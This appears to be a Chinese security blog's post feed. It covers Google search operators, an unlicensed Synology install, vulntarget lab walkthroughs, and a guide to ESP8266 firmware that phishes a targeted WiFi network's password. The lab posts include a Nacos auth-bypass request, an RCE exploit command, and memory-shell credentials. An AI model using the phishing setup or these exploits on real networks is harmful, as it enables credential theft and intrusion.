二十六、daterange，当我们使用daterange进行查询的时候，Google会将查询的结果限制在一个特定的时间段内，这个时间相对于网站来说，是按网站被Google收录的时间算的。例如：”Spice Girls“ daterange:2450958-2450968。这里时间日期的格式是按天文学的儒略日。（这个搜索语法Google并不推荐使用，因为它会返回一些莫名其妙的东西）
二十七、allintext: &#x3D; 搜索文本,但不包括网页标题和链接allinlinks: &#x3D; 搜索链接, 不包括文本和标题WordA OR WordB &#x3D; 搜索包含两关键词之一的页面“Word” OR “Phrase” &#x3D; 精确的要求搜索单词或者句子WordA -WordB &#x3D; 包含单词A但是不包含单词BWordA +WordB &#x3D; 都包含WORD &#x3D; 寻找此单词和它的同义词WORD-WORD &#x3D; 只搜索同义词,不要原词
]]></content>
      <categories>
        <category>红队笔记</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>NAS后续-安装黑群晖</title>
    <url>/2023/02/27/NAS%E5%90%8E%E7%BB%AD-%E5%AE%89%E8%A3%85%E9%BB%91%E7%BE%A4%E6%99%96/</url>
    <content><![CDATA[首先上GitHub找到arpl，下载这个img的文件（这个格式是通用的，可供物理机也可供虚拟机使用）

接着解压得到img文件，利用图吧工具箱中的Rufus将其刷到U盘里

然后把刷好的U盘放到NAS主机上，开机进BIOS设置从U盘启动（一般是默认好的），确认无误后点击save&amp;exit进行重启

当编译系统出现如下页面时就表示已经启动好了，我们需要记下编译系统的IP地址（这里我们路由器开了DHCP，系统会自动去获取IP地址，记得插上网线哦）

在同一局域网下，使用另外一台电脑的浏览器打开编译系统显示的IP地址和端口，会显示以下界面，在Choose a model处回车显示出本机可编译黑群晖的型号

这里我们选的是DS920+，用方向键选好以后按回车键

接下来在Choose a Build Number处回车

选择我们想要编译的黑群晖版本，这里我们选择的是最新的7.1.1-42962版本


在Choose a serial number处回车

接着在Generate a random serial number处回车，编译系统会随机生成一个序列号

在Addons处回车（如果使用的CPU不是10代，此处操作直接跳过）

再点击Add an addons处回车

在Intel iGPU Drivers(10th Gen)处回车，加载十代CPU核显驱动

这里直接回车即可，无需等待它

加载好驱动后，查看Add an addons处发现10th已经不见了即说明添加上了，再在Exit处回车返回上级菜单

在Build the loader处回车，开始编译

这里就只是编译boot文件，所以不挂代理也能快速完成编译

引导编译完成后，系统会自动跳回这个界面，并且会多出一行菜单Boot the loder，点击回车，把NAS主机手动重启一次，编译好的引导就会自动启动

该项目编译出来的引导启动后显示的界面如下，会显示系统型号、系统版本等

然后直接访问IP或者5000端口即可看到

再去官网下载一下pat镜像包并将其上传


开始安装系统

装好后会重启一下，可能需要等待一段时间


等待一会即可

点击开始

填写一下自己的设备名以及账号密码，然后不要去勾选那个，填完直接下一步就行

这里我们是黑群晖就不要去选它推荐的自动安装，应该去选手动安装

选择跳过

勾选并提交

至此，我们就完成了黑群晖的安装🎉

进来后先跟着提示创建存储，这里我们选择RAID1再下一步

将两块硬盘都选上再下一步

勾选执行硬盘检查再下一步

点击最大化后下一步

选择推荐的Btrfs再下一步

确认无误后应用即可

大功告成，上床睡大觉啦😁

后续像这里可以用邮箱启用等操作都还待研究🤔

]]></content>
      <categories>
        <category>折腾实录</category>
      </categories>
      <tags>
        <tag>NAS</tag>
      </tags>
  </entry>
  <entry>
    <title>esp8266钓鱼获取指定WiFi密码</title>
    <url>/2022/08/10/esp8266towifi/</url>
    <content><![CDATA[前言前段时间收拾东西在以前瞎捣鼓的智能灯上把esp8266拆了下来，想着拿来研究无线电这块的知识，然后发现了一篇 用ESP8266无线模块进行钓鱼渗透测试 的文章，接下来就来复现一下吧

准备工作硬件方面：esp8266 无线模块（我的和作者一样是块esp01）、USB 转 TTL 烧录器
软件方面：ESP8266Flasher - nodemcu、XCOM串口调试助手、作者更新的固件
链接：https://pan.baidu.com/s/1NiO9Ty_zDIvia-IgOtqrxw提取码：qkck

烧录将我们的esp8266-01与烧录器连接然后插入电脑上，接着打开设备管理器找到 cp210x 这个端口

接着我们打开nodemcu，在operation模块下选择com6端口

然后在config模块下，输入固件路径，烧录地址 0x00000

最后回到operation模块，点击 flash 开始烧录，当出现绿勾则说明烧录成功，如果烧录失败请擦除 flash 后重试（本人暂无出现失败情况

测试
wifi名称FishAP，密码：gkdamm666 后台：http://192.168.0.1/backdoor.html

首先我们需要连接FishAP这个WiFi，然后访问后台，等待一会让模块扫描出附近的WiFi（PS：如果找不到FishAP这个WiFi，就重启模块

接着勾选通用型，填写编号（编号就是列表最前面的那个数字，需要找到你所指定WiFi对应的编号

没显示加密的那个就是我们的钓鱼WiFi

灯亮表示在钓鱼，钓到密码以后灯灭，WiFi列表重新出现fishap，连接上打开后台即可看到密码

总结建议别用esp8266-01进行钓鱼，它更适用于做WiFi杀手。其一是因为其性能低，加载钓鱼界面很久。其二，它的信号范围极小，别人很难扫描到。最好还是用加大功率的无线网卡配合fluxion等开源钓鱼项目
]]></content>
      <categories>
        <category>研究随笔</category>
      </categories>
      <tags>
        <tag>esp8266</tag>
      </tags>
  </entry>
  <entry>
    <title>vulntarget-n</title>
    <url>/2024/11/16/vulntarget-n/</url>
    <content><![CDATA[前言在面对勒索病毒这样的网络威胁时，我们不能被动等待，而要积极应对。我们需要了解攻击的原理和过程，熟练掌握应急响应和取证分析的技术，以便在面对真实的威胁时能够迅速有效地应对。
vulntarget-n是一个模拟全球化勒索病毒高发环境下的应急响应和取证分析案例，其模拟了一个正常运行的业务服务被勒索病毒攻击的情景：

客户在阿里云部署的业务环境
今天突然发现首页变成了一个勒索的界面，要求用户支付赎金以解密数据
客户发现其中部分重要文件被加密为.vulntarget结尾


随即客户要你进行应急响应并取证分析，因为是阿里云的ECS，客户将阿里云ECS实例镜像导出到本地，要求你在明天分析出结果。
具体要求如下：

分析攻击事件是如何发生的，请给出攻击画像
解密勒索
恢复原来的index.jsp页面，恢复正常的web服务
找到隐藏在其中的3个flag

已知服务器系统为Ubuntu20.04，账号密码： 账号：root 密码：Vulntarget@123
ps：在本次靶场设计中少了一次反弹shell的操作，主要是防止设计者的ip出现泄露，在攻击路径描述中可以直接把反弹shell的步骤加上即可。
准备工作解压完是个raw文件，VMware无法直接打开

可利用qemu工具转换为vmdk格式
工具下载地址：https://qemu.weilnetz.de/w64/转换命令：qemu-img.exe convert -f raw -O vmdk vuln_m-j6cegcrhehdcba0r5h4v_system.raw vulntarget-n.vmdk


然后新建虚拟机，稍后安装操作系统，选择磁盘为使用现有虚拟磁盘，保持现有格式即可


应急响应首先查询特权用户特权用户等情况，未发现异常账号

然后检查是否存在异常端口、进程、开机启动项等，但也未发现异常

接着，再来查看历史命令发现flag：flag{vulntarget_very_G00d}
root@iZj6c6hytildlalnu0cwt4Z:~# cat .bash_history    1  apt update &amp;&amp; apt install openjdk-8-jdk &amp;&amp; apt install unzip -y    2  vim /etc/profile    3  source /etc/profile    4  wget https://archive.apache.org/dist/tomcat/tomcat-7/v7.0.79/bin/apache-tomcat-7.0.79.zip    5  unzip apache-tomcat-7.0.79.zip    6  mv apache-tomcat-7.0.79 /opt/tomcatmv apache-tomcat-7.0.79 /opt/tomcat    7  mv apache-tomcat-7.0.79 /opt/tomcat    8  chmod +x /opt/tomcat/bin/*.sh    9  ls   10  history    11  flag&#123;vulntarget_very_G00d&#125;   12  /opt/tomcat/bin/startup.sh   13  cp /opt/tomcat/conf/server.xml /opt/tomcat/conf/server.xml.bak   14  vim /opt/tomcat/conf/server.xml   15  ps -axu | grep tomcat   16  kill -9 6961   17  /opt/tomcat/bin/startup.sh   18  cp web.xml web.xml.bak   19  pwd    20  cd ..   21  ls   22  cd /opt/   23  ls   24  cd tomcat/   25  ls   26  cd conf/   27  cp web.xml web.xml.bak   28  vim web.xml   29  ps -axu | grep tomcat   30  kill -9 7409   31  /opt/tomcat/bin/startup.sh   32  pwd    33  cd ..   34  ls   35  cd webapps/   36  ls   37  cd ROOT/   38  ls   39  rm favicon.ico    40  cp index.jsp index.jsp.bak   41  ls   42  vim index.jsp   43  rm index.jsp   44  vim index.jsp   45  crontab -e   46  history    47  ls   48  mv vulntargetn.jsp 404.jsp   49  ls   50  rm index.jsp.bak   51  pip3 install rsa   52  ls   53  ls -lha   54  mkdir .vulntarget   55  cd .vulntarget/   56  ls   57  mkdir keys   58  ls   59  history    60  ls   61  vim get_pem.py   62  python3 get_pem.py    63  ls   64  rm get_pem.py    65  ls   66  cd ..   67  ls   68  cp .vulntarget/keys/pubkey.pem .   69  ls   70  ls | grep jsp   71  vim encrypt_vulntarget.py   72  ls   73  vim flag.jsp   74  ls | grep jsp   75  python3 encrypt_vulntarget.py    76  ls   77  cd .vulntarget/   78  ls   79  cd keys/   80  ls   81  cat pubkey.pem    82  cat privkey.pem    83  cd ..   84  ls   85  cd ..   86  ls   87  rm encrypt_vulntarget.py    88  rm pubkey.pem    89  ls   90  vim index.jsp   91  ls   92  cd ..   93  ls   94  cd ..   95  ls   96  cd logs/   97  ls   98  cat localhost_access_log.2024-06-04.txt    99  vim localhost_access_log.2024-06-04.txt   100  ls  101  vim localhost_access_log.2024-06-04.txt   102  ls  103  history   104  curl http://127.0.0.1  105  ls  106  cd   107  ls  108  ls -lha  109  cat .bashrc   110  ls  111  history &gt; .bash_historyapt update &amp;&amp; apt install openjdk-8-jdk &amp;&amp; apt install unzip -yvim /etc/profilesource /etc/profilewget https://archive.apache.org/dist/tomcat/tomcat-7/v7.0.79/bin/apache-tomcat-7.0.79.zipunzip apache-tomcat-7.0.79.zipmv apache-tomcat-7.0.79 /opt/tomcatmv apache-tomcat-7.0.79 /opt/tomcatmv apache-tomcat-7.0.79 /opt/tomcatchmod +x /opt/tomcat/bin/*.shlshistory flag&#123;vulntarget_very_G00d&#125;/opt/tomcat/bin/startup.shcp /opt/tomcat/conf/server.xml /opt/tomcat/conf/server.xml.bakvim /opt/tomcat/conf/server.xmlps -axu | grep tomcatkill -9 6961/opt/tomcat/bin/startup.shcp web.xml web.xml.bakpwd cd ..lscd /opt/lscd tomcat/lscd conf/cp web.xml web.xml.bakvim web.xmlps -axu | grep tomcatkill -9 7409/opt/tomcat/bin/startup.shpwd cd ..lscd webapps/lscd ROOT/lsrm favicon.ico cp index.jsp index.jsp.baklsvim index.jsprm index.jspvim index.jspcrontab -ehistory lsmv vulntargetn.jsp 404.jsplsrm index.jsp.bakpip3 install rsalsls -lhamkdir .vulntargetcd .vulntarget/lsmkdir keyslshistory lsvim get_pem.pypython3 get_pem.py lsrm get_pem.py lscd ..lscp .vulntarget/keys/pubkey.pem .lsls | grep jspvim encrypt_vulntarget.pylsvim flag.jspls | grep jsppython3 encrypt_vulntarget.py lscd .vulntarget/lscd keys/lscat pubkey.pem cat privkey.pem cd ..lscd ..lsrm encrypt_vulntarget.py rm pubkey.pem lsvim index.jsplscd ..lscd ..lscd logs/lscat localhost_access_log.2024-06-04.txt vim localhost_access_log.2024-06-04.txt lsvim localhost_access_log.2024-06-04.txt lshistory curl http://127.0.0.1lscd lsls -lhacat .bashrc lshistory &gt; .bash_historyhistory exit


分析这些敏感历史命令发现攻击者可能将webshell写入到tomcat目录下，同时还发现了攻击者创建隐藏目录.vulntarget，并且编写运行get_pem.py和encrypt_vulntarget.py这两个rsa加密脚本来生成加密密钥对并加密
根据历史命令来查看tomcat日志localhost_access_log.2024-06-04.txt，可知是tomcat PUT文件上传

并且得到flag：flag{Welcome_t0_join_Us}

进入tomcat的web目录下发现一共加密了4个文件
root@iZj6c6hytildlalnu0cwt4Z:~# cat /opt/tomcat/webapps/ROOT/404.jsp.vulntarget N/nNQJJ60jZ6WvLltQK5U6+jKQ0HicpJW2gGt8YbxWqZxE+k4KyIpaDZCicGRsOHAuo+hYuLLX1wRDLt7BDvfnPdqeI/XMiGsL7nkx2Hc5FwD/MJrZYy0i5bzQvg955W6YiI8KKcfpeYI0+aZMuP7tP9duuiu+YHvmnD/1Wq0n1r/fEhWoSnZyAm5Gcc9AjpCPQQI3yF1APbDyHywCW64kOmN+kd/B5cLi62zfxgYnfUff31gtHf+G0FgHFEB0bze+epyKfBumuDGklzKajtJm79fGqlwjh26sPz6jUR1k54h6jDqM15qZKbD3z7E37k3IPpfjspTWwKchmHB6oMmEfLSXGvI4ECNb9KIVxjUADSO8oYZpNaNJmOKF4x/GndhCK++jPOHhZywhjhDHthqH+yLQGsN2+KiLqBJp8RyP8dFXbANgp+agls4cMfVTgEfQzjkJKtELBzmQoskB+WdUk9v0vczio4d//nGXeWm1eRDbL5BhQQuo2cTEFBA9aDC8mJtFCqxafLoVeWxjYac8r+0iXPIfPklpcxqDwdTam5n7GlNOeJZgFwrmuREyTQ+iGijTzIcX4eqPTTowdi+GpLTXGF1XSESl9g/OLRKrai+DVM3AoQ8fOR5DSS6b8RZvPjKNoqXpS4jSn02w7GXz3SdJcqbZwRdQ/lS712S5g=root@iZj6c6hytildlalnu0cwt4Z:~# cat /opt/tomcat/webapps/ROOT/flag.jsp.vulntarget Au+XkLqSjNieysLjjYxz9/XKnZ0l5iyhvBi4/zXw7LBBD/LykamEm5MrEIboYoL/zYE+AhvCf2a84e9ApJxsBrzcwCLSxv77dbkqzLy9+W127e1k0iz+1SM60W2315Yq1aYeEWcznVrzY9qrjtv/eXXOVEMUHONm3VLCs3mHDc0=root@iZj6c6hytildlalnu0cwt4Z:~# cat /opt/tomcat/webapps/ROOT/index.jsp.vulntarget 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root@iZj6c6hytildlalnu0cwt4Z:~# cat /opt/tomcat/webapps/ROOT/vulntarget.jsp.vulntarget goH93IcI5UeCpubU5frhuBhnmDcKEXVyE0i7yE07yyuHTVwnhRq8u44y2EbZiH77amDZrn+mWvhohGKC4is9mrjh2Fj7QuMSe5mqi9zSM4UhmIF+H8PjcYJny3KPoLko8kl+8tNMZxYiAtl9RIJ3cdXMLDPxyP6Mq42jisW2K+o=


历史命令中搜索.pem文件，找到私钥文件

从而解密得到flag：flag{https://github.com/crow821/vulntarget}
from cryptography.hazmat.primitives import serialization, hashesfrom cryptography.hazmat.primitives.asymmetric import paddingfrom cryptography.hazmat.primitives import serializationfrom cryptography.hazmat.primitives import hashesfrom cryptography.hazmat.primitives.asymmetric import rsafrom base64 import b64decode# 读取公钥和私钥文件with open(&#x27;privkey.pem&#x27;, &#x27;rb&#x27;) as key_file:    private_key = serialization.load_pem_private_key(        key_file.read(),        password=None,    )# 读取密文encrypted_flag = b64decode(&#x27;Au+XkLqSjNieysLjjYxz9/XKnZ0l5iyhvBi4/zXw7LBBD/LykamEm5MrEIboYoL/zYE+AhvCf2a84e9ApJxsBrzcwCLSxv77dbkqzLy9+W127e1k0iz+1SM60W2315Yq1aYeEWcznVrzY9qrjtv/eXXOVEMUHONm3VLCs3mHDc0=&#x27;)# 解密密文decrypted_flag = private_key.decrypt(    encrypted_flag,    padding.PKCS1v15()  # 使用PKCS#1 v1.5 padding)print(f&quot;&#123;decrypted_flag.decode(&#x27;utf-8&#x27;)&#125;&quot;)


漏洞复现直接PUT方式上传文件发现不修改后缀名上传失败了

在后面加个/验证上传成功，至此即可确认入口点为Tomcat PUT任意文件上传漏洞

业务恢复由于网站首页也被修改了，还需要解密前面的index.jsp.vulntarget

用之前的脚本会发现报错长度不一致

后面利用在线工具解密成功

替换解密后的index.jsp即可恢复

]]></content>
      <categories>
        <category>靶场通关</category>
      </categories>
      <tags>
        <tag>vulntarget</tag>
        <tag>勒索</tag>
        <tag>应急响应</tag>
      </tags>
  </entry>
  <entry>
    <title>tomcat实现国密ssl</title>
    <url>/2024/03/14/tomcat%E5%AE%9E%E7%8E%B0%E5%9B%BD%E5%AF%86ssl/</url>
    <content><![CDATA[
部署
JRE的加密策略需要切换到unlimited模式
国密Java包gmssl_provider.jar放到JRE的lib&#x2F;ext&#x2F;目录下
删除旧的国密Java包gmjce.jar和JSSE包gmjsse.jar（如果有的话）
Tomcat国密组件gmssl4t.jar放到tomcat的lib目录下
pfx文件需要包含加密证书&#x2F;私钥和签名证书&#x2F;私钥，可以在www.gmcrt.cn处申请或者合并。
sm2.pfx是双证书（SM2签名证书&#x2F;私钥、SM2加密证书&#x2F;私钥）PKCS#12文件
sm2_rsa.pfx是三证书（SM2签名证书&#x2F;私钥、SM2加密证书&#x2F;私钥、RSA证书&#x2F;私钥）PKCS#12文件

1、将JRE的加密策略切换到unlimited模式，需要找到C:\Program Files\Java\jdk1.8.0_321\jre\lib\security下的java.security，将crypto.policy&#x3D;unlimited前的‘#’去掉

2、国密Java包gmssl_provider.jar放到C:\Program Files\Java\jdk1.8.0_321\jre\lib\ext目录下

3、Tomcat国密组件gmssl4t.jar放到tomcat的lib目录下（这个在国密web服务器下载的有自带

4、查看tomcat的jre版本

可以通过编辑 tomcat&#x2F;bin&#x2F;catalina.bat文件来修改，添加：
set JAVA_HOME=C:\Program Files\Java\jdk1.8.0_321set JRE_HOME=C:\Program Files\Java\jdk1.8.0_321\jre


5、配置tomcat&#x2F;confserver.xml
    &lt;Connector port=&quot;1443&quot;          protocol=&quot;HTTP/1.1&quot;          SSLEnabled=&quot;true&quot;          sslImplementationName=&quot;cn.gmssl.tomcat.GMSSLImplementation&quot;          sslProtocol=&quot;GMSSLv1.1&quot;          keystoreFile=&quot;conf/keystore/sm2.gmssl.both.pfx&quot;          keystoreType=&quot;PKCS12&quot;          keystorePass=&quot;12345678&quot;&gt;    &lt;/Connector&gt;        #    &lt;Connector port=&quot;2443&quot;#          protocol=&quot;HTTP/1.1&quot;#          SSLEnabled=&quot;true&quot;#          clientAuth=&quot;true&quot;#          sslImplementationName=&quot;cn.gmssl.tomcat.GMSSLImplementation&quot;#          sslProtocol=&quot;GMSSLv1.1&quot;#          keystoreFile=&quot;conf/keystore/sm2.pfx&quot;#          keystoreType=&quot;PKCS12&quot;#          keystorePass=&quot;12345678&quot;&gt;#    &lt;/Connector&gt;            &lt;Connector port=&quot;3443&quot;          protocol=&quot;HTTP/1.1&quot;          SSLEnabled=&quot;true&quot;          sslImplementationName=&quot;cn.gmssl.tomcat.GMSSLImplementation&quot;          sslProtocol=&quot;GMSSLv1.1&quot;          keystoreFile=&quot;conf/keystore/sm2_rsa.pfx&quot;          keystoreType=&quot;PKCS12&quot;          keystorePass=&quot;12345678&quot;&gt;    &lt;/Connector&gt;


默认是sm2.pfx和sm2_rsa.pfx

也可以自定义生成


最后启动tomcat即可（需要使用国密浏览器才能获取到证书


]]></content>
      <categories>
        <category>研究随笔</category>
      </categories>
      <tags>
        <tag>密评</tag>
      </tags>
  </entry>
  <entry>
    <title>vulntarget-m</title>
    <url>/2024/10/27/vulntarget-m/</url>
    <content><![CDATA[前言
拓扑


入口机为双网卡，外网可以根据自身情况，设置桥接或nat模式，内网ip固定位192.168.137.20
内网机02为仅主机模式，ip固定位192.168.137.10，该ip不能变更。
内网机03为仅主机模式，ip固定位192.168.137.30

三台机子的账号密码均为vulntarget，该密码仅限调试环境使用，并不是给你用来应急的，应急需要从漏洞打进去才能应急


注意事项

本次环境vulntarget-m内网靶场主要为内网渗透+应急响应设定，其中应急部分主要涉及java内存马、后门等，因为在靶标中含有多个内存马，所以您在本地使用Vmware复现该环境时，只能够通过回滚快照的方法来重置环境，不能够将环境直接重启，重启会导致内存马失效。
同样因为内存马的特殊性，可能会导致在攻防时出现一些问题，例如在注入内存马时因为路径问题、类型问题导致的覆盖、冲突等，这时可能需要多次尝试。

环境描述

某公司将自己公司的业务搬到了云上，并存在内网服务，公司运维人员主要通过远程ssh登录入口机，对服务进行日常维护和管理。
在前段时间，某国外黑客发现该公司的入口机存在漏洞，并入侵了该机器，同时可能入侵了内网系统。
运维在今日登录维护的时候，发现ssh无法登录，经过排查发现ssh密码目前已经被修改。
由于环境特殊，暂时无法通过其他的方法对机器进行重置密码，且由于业务的重要性，不能够对服务器进行重启等。
根据以上条件：
请利用先攻再应急的特殊思维方法来进行应急。

任务目标


对3台机器进行应急排查，对其中可能的后门进行排查
不能够重启机器（重启则判定应急失败）
在你认为应急成功之后，请获取对应的flag，并对你获取的flag进行check

信息收集扫描存活主机和端口，发现开放了22、80、7848、8848、9848、9849端口

访问80端口界面如下：

存在一个登录口，经典fastjson靶机界面

然后看7848、8848这几个端口应该就是nacos服务，直接请求8848端口是它的Web控制台如下：

web打点Nacos Hessian 反序列化可利用Nacos身份绕过漏洞登录后台，后台可以得到一些配置信息，如shiro key
POST /nacos/v1/auth/users/login HTTP/1.1Host: 192.168.230.132:8848User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:104.0) Gecko/20100101 Firefox/104.0Accept: application/json, text/plain, */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 31Origin: http://192.168.230.132:8848Connection: closeReferer: http://192.168.230.132:8848/nacos/index.htmlAuthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6IjE2OTcyMDU2MDAifQ.TFQnTkHxhNqYlo8c2kuluaoVkEcngSzgS08vjUjJaOsusername=najcos&amp;password=nacjos


接着尝试Nacos Hessian 反序列化漏洞利用成功
java -jar NacosRce.jar http://192.168.230.128:8848/nacos/ 7848 &quot;whoami&quot;



一、冰蝎内存马： 1、需要设置请求头x-client-data:rebeyond 2、设置Referer:https://www.google.com/ 3、路径随意 4、密码rebeyond
二、哥斯拉内存马： 1、需要设置请求头x-client-data:godzilla 2、设置Referer:https://www.google.com/ 3、路径随意 4、密码是pass 和 key
三、CMD内存马： 1、需要设置请求头x-client-data:cmd 2、设置Referer:https://www.google.com/ 3、请求头cmd:要执行的命令

这里有个问题，用冰蝎始终连不上，可能这同时注入内存马出bug了

换成哥斯拉就成功连上了


应急响应Ⅰ
线索：运维在今日登录维护的时候，发现ssh无法登录，经过排查发现ssh密码目前已经被修改。

查看passwd和shadow文件，在passwd文件中可以发现bt用户给出的用户内容格式是个不寻常的格式，通常不会在正常用户中出现（正常的用户应该包含用户名、经过加密的密码哈希值、以及其他相关的用户信息）
bt:adrla7IBSfTZQ:0:0:eval_to_root:/root:/bin/bash



接着我们发现异常用户bt曾经登陆过，还是个特权用户


于是删除bt用户（回显用户不存在我还以为失败了

应急成功，拿下flag1：flag{6c3742aaf26a6dea7fe9d7731de59517}

who     查看当前登录用户（tty本地登陆  pts远程登录）w       查看系统信息，想知道某一时刻用户的行为uptime  查看登陆多久、多少用户，负载1、查询特权用户特权用户(uid 为0)awk -F: &#x27;$3==0&#123;print $1&#125;&#x27; /etc/passwd2、查询可以远程登录的帐号信息awk &#x27;/\$1|\$6/&#123;print $1&#125;&#x27; /etc/shadow3、除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限more /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot;4、禁用或删除多余及可疑的帐号usermod -L user    禁用帐号，帐号无法登录，/etc/shadow第二栏为!开头userdel user       删除user用户userdel -r user    将删除user用户，并且将/home目录下的user目录一并删除5、root的历史命令histroy6、打开/home各帐号目录下的.bash_history，查看普通帐号的历史命令为历史的命令增加登录的IP地址、执行命令时间等信息：1）保存1万条命令sed -i &#x27;s/^HISTSIZE=1000/HISTSIZE=10000/g&#x27; /etc/profile2）在/etc/profile的文件尾部添加如下行数配置信息：######jiagu history xianshi#########USER_IP=`who -u am i 2&gt;/dev/null | awk &#x27;&#123;print $NF&#125;&#x27; | sed -e &#x27;s/[()]//g&#x27;`if [ &quot;$USER_IP&quot; = &quot;&quot; ]thenUSER_IP=`hostname`fiexport HISTTIMEFORMAT=&quot;%F %T $USER_IP `whoami` &quot;shopt -s 